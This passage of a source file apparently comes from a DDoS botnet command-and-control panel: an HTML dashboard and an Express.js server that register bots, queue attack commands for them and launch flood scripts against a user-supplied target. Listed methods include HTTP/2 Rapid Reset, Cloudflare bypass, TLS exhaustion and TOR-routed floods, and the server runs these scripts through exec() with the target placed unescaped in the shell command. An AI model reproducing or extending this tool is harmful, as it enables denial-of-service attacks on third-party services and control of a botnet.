                    <div class="panel-badge red" id="blockedCount">0 BLOCKED</div>
                </div>
                <div class="panel-body">
                    <div class="bots-list" id="blockedList">
                        <div class="empty-state">// BLACKLIST EMPTY</div>
                    </div>
                </div>
            </div>

        </div>

        <div class="col-right">

            <div class="panel">
                <div class="panel-header">
                    <div class="panel-title">
                        <div class="panel-title-icon" style="background:var(--neon-red);box-shadow:0 0 8px var(--neon-red);"></div>
                        ATTACK VECTOR
                    </div>
                    <div class="panel-badge red">ARMED</div>
                </div>
                <div class="panel-body">

                    <div class="form-group">
                        <label class="form-label">// AUTH TOKEN</label>
                        <input type="text" id="authToken" class="form-input" placeholder="Enter auth token" value="${AUTH_TOKEN}">
                    </div>

                    <div class="form-group">
                        <label class="form-label">// TARGET ENDPOINT</label>
                        <input type="text" id="target" class="form-input" placeholder="https://target.com">
                    </div>

                    <div class="form-row">
                        <div class="form-group">
                            <label class="form-label">// DURATION (SEC)</label>
                            <input type="number" id="time" class="form-input" value="60" min="1">
                        </div>
                        <div class="form-group">
                            <label class="form-label">// ATTACK METHOD</label>
                            <select id="method" class="form-select">
                                <optgroup label="🔥 RAPID10 - MEGA ATTACK">
                                    <option value="RAPID10" style="color: #ff00ff; font-weight: bold; background: linear-gradient(90deg, #330033, #660066);">🚀 RAPID10 (ALL 10 METHODS)</option>
                                </optgroup>
                                <optgroup label="⚡ R10 SERIES - ULTRA FAST">
                                    <option value="R10-RAPID" style="color: #ff3366;">R10-RAPID - HTTP/2 Rapid Reset</option>
                                    <option value="R10-TCP" style="color: #ff3366;">R10-TCP - Raw Socket Flood</option>
                                    <option value="R10-TLS" style="color: #ff3366;">R10-TLS - SSL Handshake Exhaust</option>
                                    <option value="R10-CONN" style="color: #ff3366;">R10-CONN - Connection Tsunami</option>
                                    <option value="R10-HEADER" style="color: #ff3366;">R10-HEADER - Header Bomber</option>
                                    <option value="R10-FRAG" style="color: #ff3366;">R10-FRAG - Packet Fragment</option>
                                    <option value="R10-PIPE" style="color: #ff3366;">R10-PIPE - HTTP Pipelining</option>
                                    <option value="R10-COOKIE" style="color: #ff3366;">R10-COOKIE - Cookie Storm</option>
                                    <option value="R10-MIXED" style="color: #ff3366;">R10-MIXED - Mixed Vector</option>
                                    <option value="R10-LOWCPU" style="color: #ff3366;">R10-LOWCPU - Battery Saver</option>
                                </optgroup>
                                <optgroup label="🎯 CLASSIC METHODS">
                                    <option value="CF-BYPASS">CF-BYPASS - Cloudflare Evasion</option>
                                    <option value="MODERN-FLOOD">MODERN-FLOOD - HTTP/2 Flood</option>
                                    <option value="HTTP-SICARIO">HTTP-SICARIO - Multi-Vector</option>
                                    <option value="RAW-HTTP">RAW-HTTP - Raw Packet Flood</option>
                                    <option value="R9">R9 - High-Dstat Combo</option>
                                    <option value="PRIV-TOR">PRIV-TOR - TOR Routed</option>
                                    <option value="HOLD-PANEL">HOLD-PANEL - Panel Hold</option>
                                    <option value="R1">R1 - Full Spectrum</option>
                                    <option value="UAM">UAM - Puppeteer Bypass</option>
                                    <option value="W.I.L">W.I.L - Max Intensity</option>
                                </optgroup>
                            </select>
                        </div>
                    </div>

                    <div class="attack-row" style="margin-bottom:10px;">
                        <button class="attack-btn btn-attack-all" onclick="attackAll()" id="attackBtn">⚡ ATTACK ALL</button>
                        <button class="attack-btn btn-stop" onclick="stopAll()" id="stopBtn" style="margin-bottom:0">■ STOP ALL</button>
                    </div>
                    <button class="attack-btn btn-server" onclick="attackServer()" id="serverBtn">◈ SERVER EXECUTE</button>

                    <div class="status-alert" id="status"></div>
                </div>
            </div>

            <div class="panel">
                <div class="panel-header">
                    <div class="panel-title">
                        <div class="panel-title-icon" style="background:var(--neon-purple);box-shadow:0 0 8px var(--neon-purple);"></div>
                        ACTIVITY LOG
                    </div>
                    <button onclick="clearLogs()" style="font-family:'Share Tech Mono',monospace;font-size:0.6rem;color:var(--text-dim);background:none;border:1px solid var(--border-dim);padding:3px 10px;cursor:pointer;letter-spacing:0.1em;color:var(--text-mid);" onmouseover="this.style.borderColor='var(--border-bright)'" onmouseout="this.style.borderColor='var(--border-dim)'">CLR</button>
                </div>
                <div class="panel-body" style="padding:12px;">
                    <div class="log-terminal" id="logs">
                        <div class="log-empty">// NO ACTIVITY RECORDED</div>
                    </div>
                </div>
            </div>

        </div>

        <div class="col-sidebar">

            <div class="panel">
                <div class="panel-header">
                    <div class="panel-title">
                        <div class="panel-title-icon"></div>
                        SYSTEM STATS
                    </div>
                </div>
                <div class="panel-body">
                    <div class="stat-grid">
                        <div class="stat-card cyan">
                            <div class="stat-val" id="totalBots">0</div>
                            <div class="stat-label">Total Bots</div>
                        </div>
                        <div class="stat-card red">
                            <div class="stat-val" id="activeAttacks">0</div>
                            <div class="stat-label">Active</div>
                        </div>
                        <div class="stat-card green">
                            <div class="stat-val" id="totalAttacks">0</div>
                            <div class="stat-label">Launched</div>
                        </div>
                        <div class="stat-card purple">
                            <div class="stat-val" id="sidebarUptime">0s</div>
                            <div class="stat-label">Uptime</div>
                        </div>
                    </div>
                    
                    <!-- NEW: Bot Status Summary -->
                    <div style="margin-top: 1rem; padding-top: 1rem; border-top: 1px solid var(--border-dim);">
                        <div style="display: flex; justify-content: space-between; margin-bottom: 0.5rem;">
                            <span class="stat-label">BOTS ONLINE</span>
                            <span class="stat-value" style="font-size: 1.2rem; color: var(--neon-green);" id="botsOnline">0</span>
                        </div>
                        <div style="display: flex; justify-content: space-between; margin-bottom: 0.5rem;">
                            <span class="stat-label">BOTS ATTACKING</span>
                            <span class="stat-value" style="font-size: 1.2rem; color: var(--neon-red);" id="botsAttacking">0</span>
                        </div>
                        <div style="display: flex; justify-content: space-between;">
                            <span class="stat-label">AVG RESPONSE</span>
                            <span class="stat-value" style="font-size: 1.2rem; color: var(--neon-yellow);" id="avgResponse">0ms</span>
                        </div>
                    </div>
                </div>
            </div>

            <div class="panel">
                <div class="panel-header">
                    <div class="panel-title">
                        <div class="panel-title-icon" style="background:var(--neon-yellow);box-shadow:0 0 8px var(--neon-yellow);"></div>
                        QUICK OPS
                    </div>
                </div>
                <div class="panel-body">
                    <button class="action-btn" onclick="refreshBots()">REFRESH AGENTS</button>
                    <button class="action-btn" onclick="copyAuthToken()">COPY AUTH TOKEN</button>
                    <button class="action-btn" onclick="refreshStats()">REFRESH STATS</button>
                    <button class="action-btn danger" onclick="removeAllBots()">PURGE ALL AGENTS</button>
                    <button class="action-btn danger" onclick="clearBlockedList()">CLEAR BLACKLIST</button>
                </div>
            </div>

            <div class="panel">
                <div class="panel-header">
                    <div class="panel-title">
                        <div class="panel-title-icon" style="background:var(--neon-red);box-shadow:0 0 8px var(--neon-red);"></div>
                        WEAPON LOADOUT
                    </div>
                </div>
                <div class="panel-body">
                    <div class="method-item" style="border-color:var(--neon-green);">
                        <div>
                            <div class="method-name" style="color:var(--neon-green);">CF-BYPASS</div>
                            <div class="method-desc">CloudFlare evasion</div>
                        </div>
                    </div>
                    <div class="method-item" style="border-color:#00ccff;">
                        <div>
                            <div class="method-name" style="color:#00ccff;">MODERN-FLOOD</div>
                            <div class="method-desc">HTTP/2 exploitation</div>
                        </div>
                    </div>
                    <div class="method-item" style="border-color:var(--neon-red);">
                        <div>
                            <div class="method-name" style="color:var(--neon-red);">HTTP-SICARIO</div>
                            <div class="method-desc">Multi-vector strike</div>
                        </div>
                    </div>
                    <div class="method-item" style="border-color:#ff8800;">
                        <div>
                            <div class="method-name" style="color:#ff8800;">RAW-HTTP</div>
                            <div class="method-desc">Raw packet flood</div>
                        </div>
                    </div>
                    <div class="method-item" style="border-color:var(--neon-yellow);">
                        <div>
                            <div class="method-name" style="color:var(--neon-yellow);">R9</div>
                            <div class="method-desc">High-dstat combo</div>
                        </div>
                    </div>
                    <div class="method-item" style="border-color:var(--neon-green);">
                        <div>
                            <div class="method-name" style="color:var(--neon-green);">PRIV-TOR</div>
                            <div class="method-desc">TOR-routed flood</div>
                        </div>
                    </div>
                    <div class="method-item" style="border-color:#0088ff;">
                        <div>
                            <div class="method-name" style="color:#0088ff;">HOLD-PANEL</div>
                            <div class="method-desc">Panel hold attack</div>
                        </div>
                    </div>
                    <div class="method-item" style="border-color:var(--neon-purple);">
                        <div>
                            <div class="method-name" style="color:var(--neon-purple);">R1</div>
                            <div class="method-desc">Full-spectrum</div>
                        </div>
                    </div>
                    <div class="method-item" style="border-color:#8844ff;">
                        <div>
                            <div class="method-name" style="color:#8844ff;">UAM</div>
                            <div class="method-desc">Puppeteer CF bypass</div>
                        </div>
                    </div>
                    <div class="method-item" style="border-color:#ff44aa;">
                        <div>
                            <div class="method-name" style="color:#ff44aa;">W.I.L</div>
                            <div class="method-desc">Max intensity load</div>
                        </div>
                    </div>
                </div>
            </div>

        </div>
    </div>

    <script>
        let bots = [];
        let blockedBots = [];
        let totalAttacks = 0;
        let activeAttacks = 0;
        let startTime = Date.now();
        
        // Chart variables
        let rpsChart, methodChart;
        let rpsHistory = [];
        let lastRPS = 0;

        // Initialize charts
        function initCharts() {
            const rpsCtx = document.getElementById('rpsChart').getContext('2d');
            rpsChart = new Chart(rpsCtx, {
                type: 'line',
                data: {
                    labels: [],
                    datasets: [{
                        label: 'Requests/sec',
                        data: [],
                        borderColor: '#00f5ff',
                        backgroundColor: 'rgba(0, 245, 255, 0.1)',
                        tension: 0.4,
                        fill: true
                    }]
                },
                options: {
                    animation: false,
                    responsive: true,
                    maintainAspectRatio: false,
                    scales: {
                        x: { display: false },
                        y: { 
                            grid: { color: 'rgba(0, 245, 255, 0.1)' },
                            ticks: { color: '#00f5ff' }
                        }
                    },
                    plugins: { legend: { display: false } }
                }
            });

            const methodCtx = document.getElementById('methodChart').getContext('2d');
            methodChart = new Chart(methodCtx, {
                type: 'doughnut',
                data: {
                    labels: [],
                    datasets: [{
                        data: [],
                        backgroundColor: [
                            '#00f5ff',
                            '#ff0040',
                            '#00ff88',
                            '#ffcc00',
                            '#bf00ff'
                        ]
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: { legend: { labels: { color: '#00f5ff' } } }
                }
            });
        }

        // Fetch live stats
        async function fetchStats() {
            try {
                const response = await fetch('/api/stats?token=' + getAuthToken());
                const stats = await response.json();
                updateStatsUI(stats);
            } catch (error) {
                console.error('Failed to fetch stats:', error);
            }
        }

        // Update UI with live stats
        function updateStatsUI(stats) {
            // Update RPS/RPM
            document.getElementById('rps').innerHTML = stats.requestsPerSecond + '<span class="stat-unit">/s</span>';
            document.getElementById('rpm').innerHTML = stats.requestsPerMinute + '<span class="stat-unit">/m</span>';
            document.getElementById('totalReqs').textContent = stats.totalRequests;
            document.getElementById('activeAttacksStat').textContent = stats.activeAttacks;
            document.getElementById('peakRPS').textContent = 'Peak: ' + stats.peakRPS;
            document.getElementById('peakRPM').textContent = 'Peak: ' + stats.peakRPM;
            document.getElementById('avgResponse').textContent = Math.round(stats.averageResponseTime) + 'ms';
            document.getElementById('botsOnline').textContent = stats.botsByStatus.online;
            document.getElementById('botsAttacking').textContent = stats.botsByStatus.attacking;
            
            // Update RPS chart
            rpsHistory.push(stats.requestsPerSecond);
            if (rpsHistory.length > 30) rpsHistory.shift();
            
            rpsChart.data.labels = rpsHistory.map((_, i) => i);
            rpsChart.data.datasets[0].data = rpsHistory;
            rpsChart.update();

            // Update method chart
            const methods = Object.keys(stats.attacksByMethod);
            const counts = Object.values(stats.attacksByMethod);
            if (methods.length > 0) {
                methodChart.data.labels = methods;
                methodChart.data.datasets[0].data = counts;
                methodChart.update();
            }

            // Update method breakdown
            const methodBreakdown = document.getElementById('methodBreakdown');
            const maxCount = Math.max(...counts, 1);
            if (methods.length > 0) {
                methodBreakdown.innerHTML = methods.map(method => {
                    const count = stats.attacksByMethod[method] || 0;
                    const percentage = (count / maxCount * 100) || 0;
                    return \`
                        <div class="method-bar">
                            <span class="method-name">\${method}</span>
                            <div class="method-progress">
                                <div class="method-progress-fill" style="width: \${percentage}%"></div>
                            </div>
                            <span class="method-count">\${count}</span>
                        </div>
                    \`;
                }).join('');
            }
        }

        // Rest of your original functions
        setInterval(() => {
            const seconds = Math.floor((Date.now() - startTime) / 1000);
            const h = Math.floor(seconds / 3600);
            const m = Math.floor((seconds % 3600) / 60);
            const s = seconds % 60;
            const fmt = h > 0 ? h + 'h ' + m + 'm' : m + ':' + String(s).padStart(2,'0');
            document.getElementById('uptime').textContent = fmt;
            document.getElementById('sidebarUptime').textContent = fmt;
        }, 1000);

        setInterval(() => { refreshBots(); refreshBlockedBots(); }, 5000);

        function getAuthToken() {
            return document.getElementById('authToken').value;
        }

        function copyAuthToken() {
            const token = getAuthToken();
            navigator.clipboard.writeText(token).then(() => {
                addLog('Auth token copied to clipboard', 'success');
            }).catch(() => {
                addLog('Failed to copy token', 'error');
            });
        }

        function updateStats() {
            document.getElementById('botCount').textContent = bots.length;
            document.getElementById('totalBots').textContent = bots.length;
            document.getElementById('totalAttacks').textContent = totalAttacks;
            document.getElementById('activeAttacks').textContent = activeAttacks;
            document.getElementById('tickerBots').textContent = bots.length;
        }

        function renderBots() {
            const el = document.getElementById('botsList');
            if (!bots.length) {
                el.innerHTML = '<div class="empty-state">// AWAITING AGENT CONNECTIONS...</div>';
                return;
            }
            const now = Date.now();
            el.innerHTML = bots.map((bot, i) => {
                const online = (now - (bot.lastSeen || now)) < 30000;
                return \`
                <div class="bot-item \${online ? '' : 'offline'}">
                    <div class="bot-info">
                        <div class="bot-url">\${bot.url}</div>
                        <div class="bot-meta">
                            <span>#\${i+1}</span>
                            <span class="status-tag \${online ? '' : 'offline'}">\${online ? '● ONLINE' : '● OFFLINE'}</span>
                            <span>\${bot.time}</span>
                            \${bot.totalRequests ? '<span>📊 ' + bot.totalRequests + ' req</span>' : ''}
                        </div>
                    </div>
                    <div class="bot-actions">
                        <button class="btn btn-remove" onclick="removeBot(\${i})">RMV</button>
                        <button class="btn btn-block" onclick="blockBot(\${i})">BLK</button>
                    </div>
                </div>\`;
            }).join('');
        }

        function renderBlockedBots() {
            const el = document.getElementById('blockedList');
            document.getElementById('blockedCount').textContent = blockedBots.length + ' BLOCKED';
            if (!blockedBots.length) {
                el.innerHTML = '<div class="empty-state">// BLACKLIST EMPTY</div>';
                return;
            }
            el.innerHTML = blockedBots.map(url => \`
                <div class="bot-item offline">
                    <div class="bot-info">
                        <div class="bot-url">\${url}</div>
                        <div class="bot-meta"><span class="status-tag offline">● BLACKLISTED</span></div>
                    </div>
                    <div class="bot-actions">
                        <button class="btn btn-unblock" onclick="unblockBot('\${url}')">UNBLK</button>
                    </div>
                </div>\`).join('');
        }

        function removeBot(i) {
            const bot = bots[i];
            bots.splice(i, 1);
            renderBots();
            updateStats();
            addLog('Agent removed: ' + bot.url, 'info');
        }

        async function blockBot(i) {
            const bot = bots[i];
            if (!confirm('Permanently blacklist this agent?\\n\\n' + bot.url)) return;
            try {
                const r = await fetch('/block-bot?bot=' + encodeURIComponent(bot.url) + '&token=' + getAuthToken());
                const d = await r.json();
                if (d.success) {
                    bots.splice(i, 1);
                    renderBots();
                    updateStats();
                    refreshBlockedBots();
                    addLog('Agent blacklisted: ' + bot.url, 'success');
                } else addLog('Block failed: ' + d.error, 'error');
            } catch(e) { addLog('Network error: ' + e.message, 'error'); }
        }

        async function unblockBot(url) {
            if (!confirm('Remove from blacklist?\\n\\n' + url)) return;
            try {
                const r = await fetch('/unblock-bot?bot=' + encodeURIComponent(url) + '&token=' + getAuthToken());
                const d = await r.json();
                if (d.success) { refreshBlockedBots(); addLog('Agent unblocked: ' + url, 'success'); }
                else addLog('Unblock failed: ' + d.error, 'error');
            } catch(e) { addLog('Network error: ' + e.message, 'error'); }
        }

        function removeAllBots() {
            if (confirm('Purge all agents?')) { bots = []; renderBots(); updateStats(); addLog('All agents purged', 'info'); }
        }

        function clearBlockedList() {
            if (confirm('Clear entire blacklist?')) { 
                blockedBots = []; 
                renderBlockedBots(); 
                addLog('Blacklist cleared', 'info'); 
            }
        }

        async function refreshBots() {
            try {
                const r = await fetch('/bots?token=' + getAuthToken());
                const d = await r.json();
                bots = d.bots;
                renderBots();
                updateStats();
            } catch(e) {}
        }

        async function refreshBlockedBots() {
            try {
                const r = await fetch('/blocked?token=' + getAuthToken());
                const d = await r.json();
                blockedBots = d.blocked;
                renderBlockedBots();
            } catch(e) {}
        }

        function refreshStats() {
            fetchStats();
            addLog('Stats refreshed', 'info');
        }

        async function attackAll() {
            const target = document.getElementById('target').value;
            const time = document.getElementById('time').value;
            const method = document.getElementById('method').value;
            const token = getAuthToken();
            
            if (!target || !time) { addLog('ERROR: Target and duration required', 'error'); return; }
            if (!bots.length) { addLog('ERROR: No agents connected', 'error'); return; }

            const btn = document.getElementById('attackBtn');
            btn.disabled = true;
            btn.textContent = 'LAUNCHING...';
            activeAttacks++; totalAttacks++;
            updateStats();
            addLog('Deploying ' + method + ' to ' + bots.length + ' agents', 'info');
            addLog('Target: ' + target + ' | Duration: ' + time + 's', 'info');

            let ok = 0, fail = 0;
            for (const bot of bots) {
                try {
                    const r = await fetch('/attack-bot?bot=' + encodeURIComponent(bot.url) + '&target=' + encodeURIComponent(target) + '&time=' + time + '&methods=' + method + '&token=' + token);
                    const d = await r.json();
                    if (d.success) { ok++; addLog(bot.url + ' — ARMED', 'success'); }
                    else { fail++; addLog(bot.url + ' — FAILED', 'error'); }
                } catch(e) { fail++; addLog(bot.url + ' — UNREACHABLE', 'error'); }
            }
            addLog('Strike deployed: ' + ok + ' OK / ' + fail + ' FAIL', ok > 0 ? 'success' : 'error');
            setTimeout(() => { activeAttacks = Math.max(0, activeAttacks - 1); updateStats(); }, parseInt(time) * 1000);
            btn.disabled = false;
            btn.textContent = '⚡ ATTACK ALL';
        }

        async function stopAll() {
            const btn = document.getElementById('stopBtn');
            btn.disabled = true;
            btn.textContent = 'HALTING...';
            try {
                const r = await fetch('/stop-all?token=' + getAuthToken());
                const d = await r.json();
                if (d.success) { addLog('Abort signal broadcast: ' + d.message, 'success'); activeAttacks = 0; updateStats(); }
                else addLog('Stop command failed', 'error');
            } catch(e) { addLog('Network error: ' + e.message, 'error'); }
            finally { btn.disabled = false; btn.textContent = '■ STOP ALL'; }
        }

        async function attackServer() {
            const target = document.getElementById('target').value;
            const time = document.getElementById('time').value;
            const method = document.getElementById('method').value;
            const token = getAuthToken();
            
            if (!target || !time) { addLog('ERROR: Target and duration required', 'error'); return; }

            const btn = document.getElementById('serverBtn');
            const status = document.getElementById('status');
            btn.disabled = true;
            btn.textContent = 'EXECUTING...';
            activeAttacks++; totalAttacks++;
            updateStats();
            addLog('Server executing ' + method + ' on ' + target, 'info');

            try {
                const r = await fetch('/attack?target=' + encodeURIComponent(target) + '&time=' + time + '&methods=' + method + '&token=' + token);
                const d = await r.json();
                if (r.ok) {
                    addLog('Server strike active!', 'success');
                    status.style.display = 'block';
                    status.innerHTML = '<span style="color:var(--neon-red)">SERVER ACTIVE</span> → <span style="color:var(--text-mid)">' + target + '</span> | <span style="color:var(--neon-yellow)">' + method + '</span> | <span style="color:var(--neon-green)">' + time + 's</span>';
                    setTimeout(() => { activeAttacks = Math.max(0, activeAttacks - 1); updateStats(); }, parseInt(time) * 1000);
                } else { addLog('Server strike failed', 'error'); activeAttacks = Math.max(0, activeAttacks - 1); updateStats(); }
            } catch(e) { addLog('Network error: ' + e.message, 'error'); activeAttacks = Math.max(0, activeAttacks - 1); updateStats(); }
            btn.disabled = false;
            btn.textContent = '◈ SERVER EXECUTE';
        }

        function addLog(msg, type = 'info') {
            const el = document.getElementById('logs');
            const ts = new Date().toLocaleTimeString('en', {hour12: false});
            const tags = {info:'[INFO]', success:'[OK]  ', error:'[ERR] '};
            if (el.querySelector('.log-empty')) el.innerHTML = '';
            const div = document.createElement('div');
            div.className = 'log-entry';
            div.innerHTML = \`<span class="log-time">\${ts}</span><span class="log-tag \${type}">\${tags[type]}</span><span class="log-msg">\${msg}</span>\`;
            el.appendChild(div);
            el.scrollTop = el.scrollHeight;
        }

        function clearLogs() { document.getElementById('logs').innerHTML = '<div class="log-empty">// NO ACTIVITY RECORDED</div>'; }

        // Initialize
        initCharts();
        refreshBots();
        refreshBlockedBots();
        setInterval(fetchStats, 1000); // Update stats every second
    </script>

</body>
</html>
  `);
});

// API Endpoints with authentication
app.post('/register', (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ error: 'Bot URL required' });

  if (blockedBots.has(url)) {
    console.log(`[BLOCKED] Bot tried to register: ${url}`);
    return res.status(403).json({ error: 'Bot is blocked', approved: false, message: 'This bot has been permanently blocked by the server' });
  }

  const exists = connectedBots.find(bot => bot.url === url);
  if (exists) {
    exists.lastSeen = Date.now();
    return res.json({ message: 'Bot already registered', approved: true });
  }

  const newBot = { url, time: new Date().toLocaleTimeString(), approved: true, lastSeen: Date.now() };
  connectedBots.push(newBot);
  botStats.totalBots = connectedBots.length;
  console.log(`[AUTO-APPROVED] New bot registered: ${url}`);
  res.json({ message: 'Bot auto-approved and registered successfully', approved: true, bot: newBot });
});

app.get('/get-command', (req, res) => {
  const { botUrl } = req.query;
  if (!botUrl) return res.status(400).json({ error: 'Bot URL required' });
  
  const bot = connectedBots.find(b => b.url === botUrl);
  if (bot) bot.lastSeen = Date.now();
  
  if (stopCommands.has(botUrl)) {
    stopCommands.delete(botUrl);
    return res.json({ hasCommand: true, command: { action: 'stop' } });
  }
  
  if (pendingCommands[botUrl]) {
    const command = pendingCommands[botUrl];
    delete pendingCommands[botUrl];
    return res.json({ hasCommand: true, command: { action: 'attack', ...command } });
  }
  
  res.json({ hasCommand: false });
});

app.get('/bots', authenticate, (req, res) => res.json({ bots: connectedBots }));

app.get('/ping', (req, res) => res.json({ 
  alive: true, 
  timestamp: Date.now(), 
  status: 'online',
  stats: botStats,
  uptime: process.uptime()
}));

app.get('/attack-bot', authenticate, async (req, res) => {
  const { bot, target, time, methods } = req.query;
  if (!bot || !target || !time || !methods) return res.json({ success: false, error: 'Missing parameters' });
  
  // Validate time is a number and reasonable
  const timeNum = parseInt(time);
  if (isNaN(timeNum) || timeNum < 1 || timeNum > 3600) {
    return res.json({ success: false, error: 'Invalid time parameter (1-3600 seconds)' });
  }
  
  pendingCommands[bot] = { target, time: timeNum, methods, timestamp: Date.now() };
  
  // Update stats
  botStats.totalAttacks++;
  botStats.activeAttacks++;
  botStats.attacksByMethod[methods] = (botStats.attacksByMethod[methods] || 0) + 1;
  
  res.json({ success: true, message: 'Command queued for bot' });
});

app.get('/stop-bot', authenticate, async (req, res) => {
  const { bot } = req.query;
  if (!bot) return res.json({ success: false, error: 'Bot URL required' });
  
  delete pendingCommands[bot];
  stopCommands.add(bot);
  res.json({ success: true, message: 'Stop command queued for bot' });
});

app.get('/stop-all', authenticate, async (req, res) => {
  pendingCommands = {};
  connectedBots.forEach(bot => stopCommands.add(bot.url));
  botStats.activeAttacks = 0;
  res.json({ success: true, message: `Stop queued for ${connectedBots.length} bots` });
});

app.get('/block-bot', authenticate, (req, res) => {
  const { bot } = req.query;
  if (!bot) return res.json({ success: false, error: 'Bot URL required' });
  
  blockedBots.add(bot);
  connectedBots = connectedBots.filter(b => b.url !== bot);
  delete pendingCommands[bot];
  stopCommands.delete(bot);
  botStats.totalBots = connectedBots.length;
  
  res.json({ success: true, message: 'Bot blocked permanently', bot });
});

app.get('/unblock-bot', authenticate, (req, res) => {
  const { bot } = req.query;
  if (!bot) return res.json({ success: false, error: 'Bot URL required' });
  
  blockedBots.delete(bot);
  res.json({ success: true, message: 'Bot unblocked', bot });
});

app.get('/blocked', authenticate, (req, res) => res.json({ blocked: Array.from(blockedBots) }));

app.get('/attack', authenticate, (req, res) => {
  const { target, time, methods } = req.query;
  if (!target || !time || !methods) return res.status(400).json({ error: 'Missing required parameters: target, time, methods' });

  // Validate time
  const timeNum = parseInt(time);
  if (isNaN(timeNum) || timeNum < 1 || timeNum > 3600) {
    return res.status(400).json({ error: 'Invalid time parameter (1-3600 seconds)' });
  }

  // Check if method file exists
  const methodFile = methodFiles[methods];
  if (!methodFile || !fs.existsSync(methodFile)) {
    return res.status(400).json({ error: `Method file not found for ${methods}` });
  }

  console.log(`\n[SERVER-ATTACK] ${methods} -> ${target} for ${timeNum}s`);
  
  // Log attack to history
  attackHistory.push({
    target,
    time: timeNum,
    method: methods,
    timestamp: Date.now()
  });
  
  botStats.totalAttacks++;
  botStats.activeAttacks++;
  botStats.attacksByMethod[methods] = (botStats.attacksByMethod[methods] || 0) + 1;
  botStats.attacksByTarget[target] = (botStats.attacksByTarget[target] || 0) + 1;

  res.status(200).json({ 
    message: 'Server attack launched successfully', 
    target, 
    time: timeNum, 
    methods, 
    server: 'executing' 
  });

  const execWithLog = (cmd) => {
    exec(cmd, (error, stdout, stderr) => {
      if (error) { 
        console.error(`[ERROR] ${error.message}`); 
        botStats.activeAttacks = Math.max(0, botStats.activeAttacks - 1);
        return; 
      }
      if (stdout) {
        // Count requests in output (simple parsing)
        const lines = stdout.split('\n');
        const requestLines = lines.filter(l => l.includes('Request') || l.includes('GET') || l.includes('POST')).length;
        if (requestLines > 0) {
          botStats.totalRequests += requestLines;
        }
        console.log(`[OUTPUT] ${stdout}`);
      }
      if (stderr) console.error(`[STDERR] ${stderr}`);
    });
  };

  // Execute based on method
  switch(methods) {
    case 'CF-BYPASS':
      execWithLog(`node methods/cf-bypass.js ${target} ${timeNum} 4 32 proxy.txt`);
      break;
      
    case 'MODERN-FLOOD':
      execWithLog(`node methods/modern-flood.js ${target} ${timeNum} 4 64 proxy.txt`);
      break;
      
    case 'HTTP-SICARIO':
      execWithLog(`node methods/REX-COSTUM.js ${target} ${timeNum} 32 6 proxy.txt --randrate --full --legit --query 1`);
      execWithLog(`node methods/cibi.js ${target} ${timeNum} 16 3 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${timeNum} 32 2 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${timeNum} 12 4 proxy.txt`);
      break;
      
    case 'RAW-HTTP':
      execWithLog(`node methods/h2-nust ${target} ${timeNum} 15 2 proxy.txt`);
      execWithLog(`node methods/http-panel.js ${target} ${timeNum}`);
      break;
      
    case 'R9':
      execWithLog(`node methods/high-dstat.js ${target} ${timeNum} 32 7 proxy.txt`);
      execWithLog(`node methods/w-flood1.js ${target} ${timeNum} 8 3 proxy.txt`);
      execWithLog(`node methods/vhold.js ${target} ${timeNum} 16 2 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${timeNum} 16 2 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${timeNum} 8 1 proxy.txt`);
      break;
      
    case 'PRIV-TOR':
      execWithLog(`node methods/w-flood1.js ${target} ${timeNum} 64 6 proxy.txt`);
      execWithLog(`node methods/high-dstat.js ${target} ${timeNum} 16 2 proxy.txt`);
      execWithLog(`node methods/cibi.js ${target} ${timeNum} 12 4 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${timeNum} 10 4 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${timeNum} 10 1 proxy.txt`);
      break;
      
    case 'HOLD-PANEL':
      execWithLog(`node methods/http-panel.js ${target} ${timeNum}`);
      break;
      
    case 'R1':
      execWithLog(`node methods/vhold.js ${target} ${timeNum} 15 2 proxy.txt`);
      execWithLog(`node methods/high-dstat.js ${target} ${timeNum} 64 2 proxy.txt`);
      execWithLog(`node methods/cibi.js ${target} ${timeNum} 4 2 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${timeNum} 16 2 proxy.txt`);
      execWithLog(`node methods/REX-COSTUM.js ${target} ${timeNum} 32 6 proxy.txt --randrate --full --legit --query 1`);
      execWithLog(`node methods/w-flood1.js ${target} ${timeNum} 8 3 proxy.txt`);
      execWithLog(`node methods/vhold.js ${target} ${timeNum} 16 2 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${timeNum} 32 3 proxy.txt`);
      break;
    
    case 'RAPID10':
  console.log(`🔥🔥 RAPID10: LAUNCHING ALL 10 R10 VECTORS 🔥🔥`);
  console.log(`Target: ${target} | Duration: ${timeNum}s | Intensity: MAXIMUM`);
  
  // Launch ALL 10 R10 scripts simultaneously
  execWithLog(`node methods/r10-rapid.js ${target} ${timeNum} 10000`);     // HTTP/2 Rapid Reset
  execWithLog(`node methods/r10-tcp.js ${target} ${timeNum}`);             // TCP Cannon
  execWithLog(`node methods/r10-tls.js ${target} ${timeNum}`);             // TLS Hammer
  execWithLog(`node methods/r10-conn.js ${target} ${timeNum}`);            // Connection Tsunami
  execWithLog(`node methods/r10-header.js ${target} ${timeNum} 5000`);     // Header Bomber
  execWithLog(`node methods/r10-frag.js ${target} ${timeNum}`);            // Packet Fragment
  execWithLog(`node methods/r10-pipe.js ${target} ${timeNum}`);            // Request Pipeline
  execWithLog(`node methods/r10-cookie.js ${target} ${timeNum}`);          // Cookie Storm
  execWithLog(`node methods/r10-mixed.js ${target} ${timeNum}`);           // Mixed Vector
  execWithLog(`node methods/r10-lowcpu.js ${target} ${timeNum} 1000`);     // Low CPU Optimized
  
  console.log(`✅ RAPID10: ALL 10 ATTACK VECTORS DEPLOYED`);
  break;
      
    case 'UAM':
      execWithLog(`node methods/uam.js ${target} ${timeNum} 5 4 6`);
      break;
      
    case 'W.I.L':
      execWithLog(`node methods/wil.js ${target} ${timeNum} 10 8 4`);
      break;
      
    default:
      console.error(`[ERROR] Unknown method: ${methods}`);
      botStats.activeAttacks = Math.max(0, botStats.activeAttacks - 1);
  }
  
  // Decrement active attacks after duration
  setTimeout(() => {
    botStats.activeAttacks = Math.max(0, botStats.activeAttacks - 1);
  }, timeNum * 1000);
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('[SERVER ERROR]', err.stack);
